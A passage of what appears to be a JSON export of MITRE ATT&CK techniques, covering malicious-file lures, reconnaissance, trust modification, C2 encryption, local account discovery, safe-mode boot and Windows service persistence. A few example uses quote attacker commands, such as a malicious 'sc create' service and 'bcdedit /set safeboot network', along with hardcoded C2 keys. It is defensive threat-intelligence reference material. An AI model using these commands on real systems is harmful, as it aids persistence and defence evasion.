      "During  threat actors relied on a victim to enable macros within a malicious Word document.",
      "has relied on users to execute malicious file attachments delivered via spearphishing emails.",
      "has attempted to lure victims into enabling malicious macros within email attachments.",
      "has attempted to get users to launch malicious Microsoft Word attachments delivered via spearphishing emails.",
      "has attempted to lure victims into enabling malicious macros within email attachments.",
      "has achieved execution through victims opening malicious attachments including MSI files with embedded VBScript.",
      "has attempted to get users to open malicious PDF attachment and to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails.",
      "has relied upon a user opening an ISO file to enable execution of malicious shortcut files and DLLs.",
      "has convinced victims to open malicious attachments to execute malware.",
      "can achieve execution through users running malicious file attachments distributed via email.",
      "has been executed through malicious e-mail attachments.",
      "has relied upon users clicking on a malicious attachment delivered through spearphishing.",
      "During  the threat actors relied on victims executing malicious Microsoft Word or PDF files.",
      "has been executed through inducing user interaction with malicious .zip and .msi files.",
      "has tricked recipients into enabling malicious macros by getting victims to click enable content in email attachments.",
      "Some  variants required a user to enable a macro within a malicious .xls file for execution.",
      "has relied upon a victim to click on a malicious email attachment.",
      "has required user execution of a malicious MSI installer.",
      "can deliver trojanized versions of software and documents relying on user execution.",
      "has relied on users opening malicious email attachments decompressing the attached archive and double-clicking the executable within.",
      "has sent malicious files requiring direct victim interaction to execute.",
      "has relied upon users clicking on a malicious attachment delivered through spearphishing.",
      "has sent malicious files via email that tricked users into clicking Enable Content to run an embedded macro and to download malicious archives.",
      "has gained execution through victims opening malicious files.",
      "has attempted to get victims to launch malicious Microsoft Word attachments delivered via spearphishing emails.",
      "has attempted to get users to click on Office attachments with malicious macros embedded.",
      "has relied upon users clicking on a malicious attachment delivered through spearphishing.",
      "has sent spearphishing emails in an attempt to lure users into clicking on a malicious attachments.",
      "has attempted to lure users to execute a malicious dropper delivered via a spearphishing attachment.",
      "has used phishing lure documents that trick users into opening them and infecting their computers.",
      "sent spearphishing emails containing malicious attachments that urged recipients to review modifications in the file which would trigger the attack.",
      "has used malicious e-mail attachments to lure victims into executing malware.",
      "attempts to get users to launch malicious attachments delivered via spearphishing emails.",
      "has attempted to lure victims into executing malicious files.",
      "has lured targets to click on malicious files to gain execution in the target environment.",
      "has attempted to get users to click on a malicious zipped file.",
      "has used various forms of spearphishing attempting to get a user to open attachments including but not limited to malicious Microsoft Word documents .pdf and .lnk files.",
      "has lured victims to execute malicious attachments included in crafted spearphishing emails related to current topics.",
      "has been spread through malicious document lures.",
      "has used e-mails with malicious documents to lure victims into installing malware.",
      "has used e-mail attachments to lure victims into executing malicious code.",
      "The  executable has been retrieved via embedded macros in malicious Word documents.",
      "has been executed through malicious attachments contained in spearphishing emails.",
      "has gained execution through users opening malicious documents.",
      "delivered  installers as password-protected ZIP files containing heavily obfuscated JavaScript or IMG files containing an LNK mimicking a Word document and a malicious DLL.",
      "has used malicious files to infect the victim machines.",
      "has lured targets into opening malicious .pdf files to deliver malware.",
      "has been installed through a malicious macro in a Microsoft Word document.",
      "has relied on users to execute a malicious attachment delivered via spearphishing.",
      "has been executed through Word and Excel files with malicious embedded macros and through ISO and LNK files that execute the malicious DLL.",
      "relies on user interaction and execution of malicious attachments and similar for initial execution on victim systems.",
      "has lured users into opening malicious email attachments for execution.",
      "relied on users interacting with malicious files such as a trojanized PuTTY installer for initial execution.",
      "relies on user execution of a malicious file for installation.",
      "has prompted users to execute downloaded software and payloads as the result of social engineering activity.",
      "has been executed through a Microsoft Word document with a malicious macro.",
      "distributed malicious LNK objects for user execution during .",
      "has gained initial execution through victims opening malicious executable files embedded in zip archives and MSI files within RAR files.",
      "has attempted to lure victims into enabling malicious macros within email attachments. Additionally  has used malicious Word documents and shortcut files."
    ],
    "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg.Adversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) While [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
    "similar_words": [
      "Malicious File"
    ],
    "id": "T1204.002"
  },
  "attack-pattern--2339cf19-8f1e-48f7-8a91-0262ba547b6f": {
    "name": "Identify Business Tempo",
    "example_uses": [],
    "description": "Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organizations business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victims hardware and software resources.Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))",
    "similar_words": [
      "Identify Business Tempo"
    ],
    "id": "T1591.003"
  },
  "attack-pattern--24286c33-d4a4-4419-85c2-1d094a896c26": {
    "name": "Hardware",
    "example_uses": [],
    "description": "Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: hostnames, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Compromise Hardware Supply Chain](https://attack.mitre.org/techniques/T1195/003) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).",
    "similar_words": [
      "Hardware"
    ],
    "id": "T1592.001"
  },
  "attack-pattern--24769ab5-14bd-4f4e-a752-cfb185da53ee": {
    "name": "Trust Modification",
    "example_uses": [
      "adds a federated identity provider to the victims SSO tenant and activates automatic account linking.",
      "can create a backdoor by converting a domain to a federated domain which will be able to authenticate any user across the tenant.  can also modify DesktopSSO information.",
      "During the   changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate."
    ],
    "description": "Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.Manipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002) without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.(Citation: AADInternals zure AD Federated Domain) An adversary may also add a new federated identity provider to an identity tenant such as Okta or AWS IAM Identity Center, which may enable the adversary to authenticate as any user of the tenant.(Citation: Okta Cross-Tenant Impersonation 2023) This may enable the threat actor to gain broad access into a variety of cloud-based services that leverage the identity tenant. For example, in AWS environments, an adversary that creates a new identity provider for an AWS Organization will be able to federate into all of the AWS Organization member accounts without creating identities for each of the member accounts.(Citation: AWS RE:Inforce Threat Detection 2024)",
    "similar_words": [
      "Trust Modification"
    ],
    "id": "T1484.002"
  },
  "attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41": {
    "name": "Symmetric Cryptography",
    "example_uses": [
      "has encrypted traffic with RC4.",
      "has encrypted its C2 traffic with RC4.",
      "uses variations of a simple XOR encryption routine for C&C communications.",
      "has used DES to encrypt all C2 communications.",
      "encrypts some C2 traffic with the Blowfish cipher.",
      "command and control commands are encrypted within the HTTP C2 channel using the DES algorithm in CBC mode with a key derived from the MD5 hash of the string HYF54&%9&jkMCXuiS.  will use an 8-byte XOR key derived from the string HYF54&%9&jkMCXuiS if the DES decoding fails",
      "will decrypt resources it downloads with HTTP requests by using RC4 with the key ScoutEagle.",
      "has used AES to exfiltrate documents.",
      "can encrypt C2 traffic using XOR.",
      "variants reported on in 2014 and 2015 used a simple XOR cipher for C2. Some  samples encrypt C2 communications with RC4.",
      "uses an XOR 0x1 loop to encrypt its C2 domain.",
      "encrypts exfiltrated data with RC4.",
      "can XOR encrypt C2 traffic.",
      "has the ability to encrypt communications with D3DES.",
      "encrypts C2 data with a ROR by 3 and an XOR by 0x23.",
      "uses AES to encrypt certain information sent over its C2 channel.",
      "has encrypted C2 communications with RC4.",
      "can RC4 encrypt C2 communications.",
      "has the ability to use an RC4 key to encrypt communications to and from actor-controlled C2 servers.",
      "has used AES-256 and 3DES for C2 communications.",
      "has encrypted data symmetrically using a randomly generated Blowfish (OFB) key which is encrypted with a public RSA key.",
      "performs XOR encryption.",
      "can encrypt C2 traffic using XOR with a hard coded key.",
      "provides a reverse shell connection on 8338/TCP encrypted via AES.",
      "has used AES for encrypting C2 traffic.",
      "encrypted C2 traffic using a single-byte-XOR cipher.",
      "has used an RC4-based encryption method for its C2 communications.",
      "performs XOR encryption.",
      "can use AES encryption for C2 data transferred.",
      "encrypts data sent to its C2 server over HTTP with RC4.",
      "uses AES with a hardcoded pre-shared key to encrypt network communication.",
      "has compressed network communications and encrypted them with a custom stream cipher.",
      "can XOR-encrypt C2 communications.",
      "can perform a decremental-xor encryption on the initial C2 request before sending it over the wire.",
      "uses RC4 to encrypt the message body of HTTP content.",
      "encrypts C2 traffic with a double XOR using two distinct single-byte keys.",
      "encrypts C2 data with RC4 encryption.",
      "During   used an AES key to communicate with their C2 server.",
      "uses a custom encryption algorithm which consists of XOR and a stream that is similar to the Blum Blum Shub algorithm.",
      "encrypts C2 data with AES256 in ECB mode.",
      "can send additional modules over C2 encrypted with a simple substitution cipher.",
      "encrypts C2 traffic using an XOR/ADD cipher.",
      "can encrypt its C2 with RC4 with the password `warzone160\\x00`.",
      "Before being appended to image files  commands are encrypted with a key composed of both a hard-coded value and a string contained on that day's tweet. To decrypt the commands an investigator would need access to the intended malware sample the day's tweet and the image file containing the command.",
      "can encrypt the data beneath its http2 or tcp encryption at the session layer with CAST-128 using a different key for incoming and outgoing data.",
      "can encrypt C2 communications with a randomly generated key.",
      "encrypts data sent back to the C2 using AES in CBC mode with a null initialization vector (IV) and a key sent from the server that is padded to 32 bytes.",
      "The C2 server response to a beacon sent by a variant of  contains a 36-character GUID value that is used as an encryption key for subsequent network communications. Some variants of  use various XOR operations to encrypt C2 data.",
      "The original variant of  encrypts C2 traffic using a custom encryption cipher that uses an XOR key of YHCRA and bit rotation between each XOR operation. Some variants of  use RC4 to encrypt C2 traffic.",
      "can RC4 encrypt strings in C2 communication.",
      "Several  malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. Another  malware sample XORs C2 traffic. Other  malware uses Caracachs encryption to encrypt C2 payloads.  has also used AES to encrypt C2 traffic.",
      "has the ability to RC4 encrypt C2 communications.",
      "uses a secret key with a series of XOR and addition operations to encrypt C2 traffic.",
      "encodes C2 traffic with single-byte XOR keys.",
      "has used AES encrypted communications in C2.",
      "has used a version of the Awen web shell that employed AES encryption and decryption for C2 communications.",
      "uses a simple XOR cipher to encrypt traffic and files.",
      "encrypts C2 content with XOR using a single byte 0x12.",
      "can RC4 encrypt C2 commands.",
      "uses an RC4-like algorithm with an already computed PRGA generated key-stream for network communication.",
      "encrypts C2 traffic using RC4 with a static key.",
      "can XOR and AES encrypt C2 messages.",
      "can use an AES key to encrypt C2 communications.",
      "Some versions of  have used the hard-coded string this is the encrypt key for Blowfish encryption when communicating with a C2. Later versions have hard-coded keys uniquely for each C2 address.",
      "obfuscates C2 communication using a 1-byte XOR with the key 0xBE.",
      "has used a custom TCP protocol with four-byte XOR for command and control (C2).",
      "uses a custom crypter leveraging Microsofts CryptoAPI to encrypt C2 traffic.Newer versions of  have been known to use `bcrypt` to encrypt and digitally sign responses to their C2 server.",
      "malware encrypts C2 traffic using RC4 with a hard-coded key.",
      "encodes the payload of system information sent to the command and control servers using a one byte 0xFF XOR key.  also uses a 31-byte long static byte string to XOR data sent to command and control servers. The servers use a different static key to encrypt replies to the implant.",
      "has encrypted its C2 communications using XOR and VEST-32.",
      "has encrypted C2 traffic using the client IP address then encoded it as a hexadecimal string.",
      "has used AES ciphertext to encode C2 communications.",
      "uses RC4 encryption over TCP to communicate with its C2 server.",
      "can encrypt C2 communications with AES.",
      "can use AES-128-CBC to encrypt data for both upload and download.",
      "can send C2 communications with XOR encryption.",
      "The  command and control protocol's data stream can be encrypted with AES-CBC.",
      "has encrypted command and control (C2) communications with a stream cipher.",
      "C2 traffic is encrypted using bitwise NOT and XOR operations.",
      "uses a custom encryption algorithm on data sent back to the C2 server over HTTP.",
      "has used AES to encrypt C2 responses.",
      "A variant of  encrypts some C2 with 3DES.",
      "uses AES to encrypt C2 traffic.",
      "has encrypted communications with the RC4 method.",
      "encrypts C2 traffic with a custom RC4 variant.",
      "uses a modified version of RC4 for data transfer.",
      "uses a Linear Feedback Shift Register (LFSR) algorithm for network encryption.",
      "post-authentication communication channel uses a 32-byte-long password with RC4 for inbound and outbound traffic.",
      "uses RC4 and XOR to encrypt C2 traffic.",
      "can encrypt its C2 traffic with RC4.",
      "has encrypted its C2 communications with AES.",
      "can encrypt HTTP POST data using RC6 and a dynamically generated AES key encrypted with a hard coded RSA public key.",
      "uses RC4 to encrypt C2 responses.",
      "encrypts command and control communications with RC4.",
      "communicates to a C2 server over port 443 using modified RC4 and XOR-encrypted chunks.",
      "communications are RC4 encrypted.",
      "has used RSA encryption for C2 communications.",
      "uses custom encryption for C2 that uses 3DES.",
      "will use an AES encrypted channel for command and control purposes in one case using the key WHATswrongwithUu.",
      "uses DES to encrypt the C2 traffic.",
      "obfuscates C2 traffic with variable 4-byte XOR keys.",
      "can RC4 encrypt all incoming and outgoing C2 messages.",
      "encrypts the message body of HTTP traffic with RC2 (in CBC mode).  also uses XOR with random keys for its communications.",
      "has encrypted data sent to the C2 server using a XOR key.",
      "uses AES to encrypt network traffic. The key can be hardcoded or negotiated with the C2 server in the registration phase.",
      "used AES-128 to encrypt C2 traffic.",
      "uses the Camellia cipher to encrypt communications.",
      "can encrypt C2 requests and responses with RC4",
      "encrypts communications using AES256.",
      "can use AES-GCM-256 to encrypt a session key for C2 message exchange.",
      "can use RC4 to encrypt C2 communications.",
      "has encrypted C2 traffic with RC4 previously using keys of 88888888 and babybear.",
      "has used SEAL encryption during the initial C2 handshake.",
      "encrypts commands from the C2 server using a hardcoded key.",
      "uses AES to encrypt C2 traffic.",
      "has encrypted network communications with RC4.",
      "The  C2 channel uses an 11-byte XOR algorithm to hide data.",
      "can use RC4 encryption in C2 communications.",
      "can AES encrypt process output sent from compromised devices to C2.",
      "has the ability to use AES-256 symmetric encryption in CBC mode with HMAC-SHA-256 to encrypt task commands and XOR to encrypt shell code and configuration data.",
      "C2 traffic has been encrypted with RC4 and AES.",
      "has used the  RAT which communicates over HTTP with a payload encrypted with RC4.",
      "encrypts C2 traffic using an RC4 key.",
      "has encrypted network communications with AES.",
      "has used AES to encrypt C2 traffic.",
      "uses RC4 encryption to obfuscate HTTP traffic.",
      "has used RC4 to encrypt C2 traffic.",
      "can AES encrypt C2 communications.",
      "uses a customized XOR algorithm to encrypt C2 communications.",
      "has used AES encryption for C2 communication.",
      "The  Result Retriever module can AES encrypt C2 responses.",
      "has used AES for encryption of command and control traffic.",
      "can use RC4 to encrypt C2 communications.",
      "encodes C2 beacons using XOR.",
      "has used a dynamic XOR key and custom XOR methodology for C2 communications.",
      "has encrypted its C2 traffic with RC4.",
      "can encrypt C2 traffic with AES or RC4.",
      "can encrypt the data that it sends and receives from the C2 server using an RC4 encryption algorithm.",
      "encrypts instructions in its C2 network payloads using a simple XOR cipher.",
      "installed a Delphi backdoor that used a custom algorithm for C2 communications.",
      "has used RC4 encryption (for Datper malware) and AES (for xxmm malware) to obfuscate HTTP traffic.  has also used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server.",
      "has encrypted C2 commands with AES-256.",
      "encrypts C2 traffic using AES with a static key.",
      "has used RC4 encryption to download modules.",
      "encrypts C2 communications with RC4.",
      "C2 messages are encrypted with custom stream ciphers using six-byte or eight-byte keys.",
      "encrypts C2 communication using a combination of AES XOR ROTATE encryption and ZLIB compression.",
      "has the ability to AES encrypt C2 communications.",
      "Some  samples use a custom encryption method for C2 traffic that utilizes AES and multiple keys.",
      "During  the threat actors communicated with C2 via an encrypted RC4 byte stream and AES-CBC.",
      "can use RC4 and XOR to encrypt C2 communications.",
      "can use AES-CBC to encrypt data sent to its C2 server.",
      "contains a custom version of the RC4 algorithm that includes a programming error.",
      "can use AES in cipher block chaining (CBC) mode padded with PKCS5 to encrypt C2 server communications.",
      "is known to use RSA keys for encrypting C2 traffic.",
      "can send AES encrypted C2 commands.",
      "Earlier  variants use a custom encryption procedure leveraging multiple mechanisms including AES with multiple rounds of Base64 encoding for its command and control communication. Later  variants eliminate the use of AES and instead use RC4 encryption for transmitted information.",
      "has used AES-128 CBC to encrypt C2 communications.",
      "can use STCP (Secret TCP) with a preshared key to encrypt services exposed to public networks.",
      "can send RC4 encrypted data over C2 channels.",
      "can receive XOR-encrypted commands from C2.",
      "can XOR encrypt C2 communications.",
      "encrypts data sent to command and control infrastructure using a combination of RC4 and RSA-4096 algorithms."
    ],
    "description": "Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
    "similar_words": [
      "Symmetric Cryptography"
    ],
    "id": "T1573.001"
  },
  "attack-pattern--25659dd6-ea12-45c4-97e6-381e3e4b593e": {
    "name": "Local Account",
    "example_uses": [
      "can use net user to gather information about local accounts.",
      "can collect account information from the victims machine.",
      "collects a list of accounts with the command net users.",
      "performs account discovery using commands such as net localgroup administrators and net group REDACTED /domain on specific permissions groups.",
      "Commands under net user can be used in  to gather information about and manipulate user accounts.",
      "has collected the administrator username from a compromised host.",
      "can gather user names.",
      "can retrieve usernames from compromised hosts.",
      "The discovery modules used with  can collect information on accounts and permissions.",
      "collects information on local user accounts from the victim.",
      "enumerates local and domain users",
      "has a command to retrieve information about connected users.",
      "has run net user net user /domain net group domain admins /domain and net group Exchange Trusted Subsystem /domain to get account listings on a victim.",
      "can enumerate local and domain user account information.",
      "uses the net user command.",
      "used built-in net commands to enumerate local administrator groups.",
      "enumerated administrative users using the commands net localgroup administrators.",
      "can identify users with local administrator rights.",
      "During  the threat actors used the `net user` command to gather account information.",
      "collects the users of the system.",
      "uses the net user command.",
      "has used net user for account discovery.",
      "has used net user to enumerate local accounts on the system.",
      "has accessed ntuser.dat and UserClass.dat on compromised hosts.",
      "gathers a list of all user accounts privilege classes and time of last logon.",
      "can collect usernames from the local system via net.exe user.",
      "has used a tool that can obtain info about local and global group users power users and administrators.",
      "can obtain a list of users.",
      "may create a file containing the results of the command cmd.exe /c net user {Username}.",
      "gathers domain and account names/information through process monitoring.",
      "has a command to list account information on the victims machine.",
      "has run `C:\\Windows\\system32\\cmd.exe /c cmd /c dir c:\\users\\ /s 2>&1` to discover local accounts.",
      "has used net user to conduct internal discovery of systems.",
      "enumerates user accounts of the local host.",
      "Get-ProcessTokenGroup Privesc-PowerUp module can enumerate all SIDs associated with its current token.",
      "searches for administrator accounts on both the local victim machine and the network.",
      "can acquire local and domain user account information.",
      "uses PowerView and Pywerview to perform discovery commands such as net user net group net local group etc.",
      "actors used the following commands following exploitation of a machine with  malware to enumerate user accounts: net user >> %temp%\\download net user /domain >> %temp%\\download",
      "can enumerate all account names on a remote share.",
      "executes net user after initial communication is made to the remote server.",
      "can identify administrator accounts on an infected host.",
      "used the commands net localgroupnet user and net group to find accounts on the system.",
      "can enumerate the sessions for each user logged onto the infected host.",
      "has used the NetUserEnum function to enumerate local accounts.",
      "has the ability to enumerate local admin accounts.",
      "gathers information on local groups and members on the victims machine.",
      "has used net.exe user and net.exe users to enumerate local accounts on a compromised host.",
      "has the capability to retrieve information about users on remote hosts.",
      "can display the /etc/passwd file on a compromised host.",
      "has run the command `net user` on a victim.",
      "includes modules for identifying local administrator accounts on victim systems.",
      "can enumerate local user accounts.",
      "has executed `net user` and `quser` to enumerate local account information.",
      "will retrieve the name of the user associated with the thread under which the malware is executing.",
      "has collected information about local accounts.",
      "checks the privileges of running processes to determine if the running user is equivalent to `NT Authority\\System`.",
      "has used commands such as `net` to profile local system users.",
      "has used the PowerShell-based POWERPOST script to collect local account names from the victim machine."
    ],
    "description": "Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.Commands such as net user and net localgroup of the [Net](https://attack.mitre.org/software/S0039) utility and id and groups on macOS and Linux can list local users and groups.(Citation: Mandiant APT1)(Citation: id man page)(Citation: groups man page) On Linux, local users can also be enumerated through the use of the /etc/passwd file. On macOS, the dscl . list /Users command can be used to enumerate local accounts. On ESXi servers, the `esxcli system account list` command can list local user accounts.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)",
    "similar_words": [
      "Local Account"
    ],
    "id": "T1087.001"
  },
  "attack-pattern--274770e0-2612-4ccf-a678-ef8e7bad365d": {
    "name": "Social Media Accounts",
    "example_uses": [
      "creates credential capture webpages to compromise existing legitimate social media accounts.",
      "has compromised social media accounts to conduct social engineering attacks."
    ],
    "description": "Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001)), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. A variety of methods exist for compromising social media accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.Adversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",
    "similar_words": [
      "Social Media Accounts"
    ],
    "id": "T1586.001"
  },
  "attack-pattern--28170e17-8384-415c-8486-2e6b294cb803": {
    "name": "Safe Mode Boot",
    "example_uses": [
      "can force a reboot in safe mode with networking.",
      "can reboot victim machines in safe mode with networking via `bcdedit /set safeboot network`.",
      "can restart a compromised machine in safe mode.",
      "can reboot targeted systems into Safe Mode prior to encryption.",
      "can reboot the infected host into Safe Mode."
    ],
    "description": "Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.(Citation: Microsoft Safe Mode)(Citation: Sophos Snatch Ransomware 2019)Adversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.(Citation: Microsoft bcdedit 2021)Adversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)). Malicious [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) objects may also be registered and loaded in safe mode.(Citation: Sophos Snatch Ransomware 2019)(Citation: CyberArk Labs Safe Mode 2016)(Citation: Cybereason Nocturnus MedusaLocker 2020)(Citation: BleepingComputer REvil 2021)",
    "similar_words": [
      "Safe Mode Boot"
    ],
    "id": "T1562.009"
  },
  "attack-pattern--28abec6c-4443-4b03-8206-07f2e264a6b4": {
    "name": "TFTP Boot",
    "example_uses": [],
    "description": "Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image](https://attack.mitre.org/techniques/T1601) to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result in the network device running a modified image. (Citation: Cisco Blog Legacy Device Attacks)",
    "similar_words": [
      "TFTP Boot"
    ],
    "id": "T1542.005"
  },
  "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32": {
    "name": "Windows Service",
    "example_uses": [
      "has created a Windows service named `WmdmPmSp` to establish persistence.",
      "can use an arbitrary system service to load at system boot for persistence and replaces the ImagePath registry value of a Windows service with a new backdoor binary.",
      "has installed a service pointing to a malicious DLL dropped to disk.",
      "has established persistence by running `sc.exe` and by setting the `WSearch` service to run automatically.",
      "sets its DLL file as a new service in the Registry to establish persistence.",
      "can modify services by using the OpenService and ChangeServiceConfig functions.",
      "installs a service pointing to a malicious DLL dropped to disk.",
      "has created new services for persistence by modifying the Registry.",
      "created and established a service that runs until the encryption process is complete.",
      "has established persistence by running in the background as an autostart service.",
      "During  the threat actors modified the `IKEEXT` and `PrintNotify` Windows services for persistence.",
      "created new services for shellcode loaders distribution.",
      "installs a copy of itself in a randomly selected service then overwrites the ServiceDLL entry in the service's Registry entry. Some  variants also install .dll files as services with names generated by a list of hard-coded strings.",
      "installs itself as a new service with automatic startup to establish persistence. The service checks every 60 seconds to determine if the malware is running; if not it will spawn a new instance.",
      "uses Windows services typically named javamtsup for persistence.",
      "creates a Registry subkey that registers a new service.  also creates a Registry entry modifying the Logical Disk Manager service to point to a malicious DLL dropped to disk.",
      "has the ability to create the following Windows service to establish persistence on an infected host: `sc create Windowscarpstss binpath= cmd.exe /c cscript.exe c:\\\\windows\\\\system32\\\\w7_1.wsf humpback_whale start= auto obj= LocalSystem`.",
      "can add a new service to ensure  persists on the system when delivered as another payload onto the system.",
      "can drop itself in `C:\\Windows\\System32\\spool\\prtprocs\\x64\\winprint.dll` as an alternative Print Processor to be loaded automatically when the spoolsv Windows service starts.",
      "has installed a new Windows service to establish persistence.",
      "can remotely create a temporary service on a target host.",
      "copies itself into the %systemroot%\\system32 directory and registers as a service.",
      "chooses a service drops a DLL file and writes it to that serviceDLL Registry key.",
      "modified legitimate Windows services to install malware backdoors.  created the StorSyncSvc service to provide persistence for Cobalt Strike.",
      "installs a service pointing to a malicious DLL dropped to disk.",
      "has installed  as a service named ControlServiceA in order to establish persistence.",
      "configures itself as a service.",
      "To establish persistence  can install itself as a new service named NtmSsvc.",
      "has made their XMRIG payloads persistent as a Windows Service.",
      "has used malware that adds cryptocurrency miners as a service.",
      "can install itself as a service.",
      "can add a service called WBService to establish persistence.",
      "uses a driver registered as a boot start service as the main load-point.",
      "has established persistence by adding itself as a new service.",
      "can establish persistence by creating a new service.",
      "creates Registry keys to allow itself to run as various services.",
      "has been modified to be used as a Windows service.",
      "can leverage Windows services to escalate privileges from administrator to SYSTEM with the -s argument.",
      "can run in memory and register its payload as a Windows service.",
      "creates a new service that loads a malicious driver when the system starts. When Duqu is active the operating system believes that the driver is legitimate as it has been signed with a valid private key.",
      "An  Port 22 malware variant registers itself as a service.",
      "creates a new service named ntssrv to execute the payload. Newer versions create the MaintenaceSrv and hdv_725x services.",
      "establishes persistence by creating an autostart service that allows it to run whenever the machine boots.",
      "establishes persistence by installing a new service pointing to its DLL and setting the service to auto-start.",
      "creates a new service named WmiApSrvEx to establish persistence.",
      "has created a service on victim machines named TaskFrame to establish persistence.",
